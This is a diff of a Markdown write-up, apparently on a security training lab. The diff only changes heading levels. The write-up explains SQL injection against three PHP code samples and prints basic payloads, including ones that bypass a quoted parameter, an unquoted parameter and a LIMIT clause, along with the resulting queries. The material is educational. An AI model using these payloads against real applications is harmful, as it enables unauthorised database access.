@@ -29,11 +29,11 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 ?> 
 ```
 
-# Abuse
+## Abuse
 
 Since there is no input sanitation for user input, we can sent a payload that didnt expected and get all data from database.
 
-# Payload
+## Payload
 
 ```php
 ' or '1'='1
@@ -45,7 +45,7 @@ Query that reaches to the database (mysql) will be:
 SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';
 ```
 
-# Result
+## Result
 
 ```php
 ID: ' or '1'='1
@@ -107,11 +107,11 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 ```
 
 
-# Abuse
+## Abuse
 
 In this code, the id parameter is not inside of apostrophe character so payload will be without it
 
-# Payload
+## Payload
 
 ```php
 1 or 1=1
@@ -124,7 +124,7 @@ SELECT first_name, last_name FROM users WHERE user_id=1 or 1=1;
 ```
 
 
-# Result
+## Result
 
 ```php
 ID: 1 or 1=1
@@ -181,11 +181,11 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 ?> 
 ```
 
-# Abuse
+## Abuse
 
 In this code there is "Limit 1" at the end of sql query which means we cant get all database like code-1 and code-2. To abuse this code, we will use the same logic in code-1 but also will add "-- -" to make comment rest of the query. 
 
-# Payload
+## Payload
 
 ```sql
 1' or '1'='1'; -- -
@@ -197,7 +197,7 @@ Query that reaches to the database (mysql) will be:
 SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'; -- -' LIMIT 1;
 ```
 
-# Result
+## Result
 
 ```php
 ID: 1' or '1'='1'; -- -
